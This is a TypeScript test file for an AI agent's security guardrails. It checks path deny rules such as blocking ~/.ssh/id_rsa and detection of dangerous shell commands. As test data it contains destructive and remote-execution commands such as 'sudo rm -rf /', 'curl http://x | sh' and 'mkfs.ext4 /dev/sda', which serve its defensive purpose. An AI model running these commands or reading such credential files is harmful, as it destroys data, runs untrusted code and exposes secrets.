import assert from 'node:assert/strict';
import { homedir } from 'node:os';
import path from 'node:path';
import {
  checkPathAllowed,
  findDangerousShellPattern,
  buildToolInputGuardrails,
  expandHome,
} from './guardrails.js';
import { DEFAULT_SECURITY, normalizeSecuritySettings } from '@okbot/shared';

const home = homedir();

{
  const ok = checkPathAllowed(path.join(home, 'Documents/a.txt'), DEFAULT_SECURITY);
  assert.equal(ok.ok, true);
}

{
  const denied = checkPathAllowed(path.join(home, '.ssh/id_rsa'), DEFAULT_SECURITY);
  assert.equal(denied.ok, false);
}

{
  const outside = checkPathAllowed('/tmp/evil.txt', DEFAULT_SECURITY);
  assert.equal(outside.ok, false);
}

{
  const withExtra = checkPathAllowed(
    '/tmp/ok.txt',
    normalizeSecuritySettings({ ...DEFAULT_SECURITY, allowedPathPrefixes: ['/tmp'] }),
  );
  assert.equal(withExtra.ok, true);
}

{
  // Defaults (field absent) still catch known dangers.
  assert.ok(findDangerousShellPattern('sudo rm -rf /'));
  assert.ok(findDangerousShellPattern('curl http://x | sh'));
  assert.equal(findDangerousShellPattern('ls -la'), null);
  assert.ok(findDangerousShellPattern('sudo rm -rf /', DEFAULT_SECURITY));
}

{
  // Custom pattern works; empty custom list disables matching.
  const custom = normalizeSecuritySettings({
    ...DEFAULT_SECURITY,
    shellPatterns: [{ id: 'ban_echo', pattern: String.raw`\becho\b`, label: 'echo' }],
  });
  assert.equal(findDangerousShellPattern('echo hi', custom), 'echo');
  assert.equal(findDangerousShellPattern('sudo rm -rf /', custom), null);

  const empty = normalizeSecuritySettings({
    ...DEFAULT_SECURITY,
    shellPatterns: [],
  });
  assert.equal(findDangerousShellPattern('sudo rm -rf /', empty), null);

  // Malformed non-empty list must not fail-open (falls back to defaults).
  const malformed = normalizeSecuritySettings({
    ...DEFAULT_SECURITY,
    shellPatterns: [{}, { re: 'x' }],
  });
  assert.equal(malformed.shellPatterns, undefined);
  assert.ok(findDangerousShellPattern('sudo rm -rf /', malformed));
}

{
  // Invalid pattern does not crash; valid sibling still matches.
  const mixed = normalizeSecuritySettings({
    ...DEFAULT_SECURITY,
    shellPatterns: [
      { id: 'bad', pattern: '(unclosed', label: 'bad' },
      { id: 'ok', pattern: String.raw`\bmkfs\b`, label: 'mkfs' },
    ],
  });
  assert.equal(findDangerousShellPattern('mkfs.ext4 /dev/sda', mixed), 'mkfs');
  assert.equal(findDangerousShellPattern('ls', mixed), null);

  // Invalid-only list must not fail-open (falls back to defaults).
  const onlyBad = normalizeSecuritySettings({
    ...DEFAULT_SECURITY,
    shellPatterns: [{ id: 'bad', pattern: '(unclosed', label: 'bad' }],
  });
  assert.equal(onlyBad.shellPatterns, undefined);
  assert.ok(findDangerousShellPattern('sudo rm -rf /', onlyBad));
}

{
  assert.equal(buildToolInputGuardrails({ ...DEFAULT_SECURITY, enabled: false }).length, 0);
  assert.ok(buildToolInputGuardrails(DEFAULT_SECURITY).length >= 1);

  // Toggle off disables shell pattern scanning guardrail.
  const off = buildToolInputGuardrails({
    ...DEFAULT_SECURITY,
    shellPatternsEnabled: false,
  });
  assert.equal(
    off.some((g) => g.name === 'okbot_shell_patterns'),
    false,
  );
  const on = buildToolInputGuardrails(DEFAULT_SECURITY);
  assert.equal(
    on.some((g) => g.name === 'okbot_shell_patterns'),
    true,
  );
}

{
  assert.equal(expandHome('~'), home);
  assert.equal(expandHome('~/Documents'), path.join(home, 'Documents'));
  assert.equal(expandHome('/tmp/x'), '/tmp/x');
  assert.equal(expandHome('relative/path'), 'relative/path');
}

console.log('guardrails.test.ts: ok');

{
  // APFS/Windows: case-variant of denied prefix must still match.
  const deniedCase = checkPathAllowed(path.join(home, '.SSH/id_rsa'), DEFAULT_SECURITY);
  if (process.platform === 'darwin' || process.platform === 'win32') {
    assert.equal(deniedCase.ok, false);
  }
}
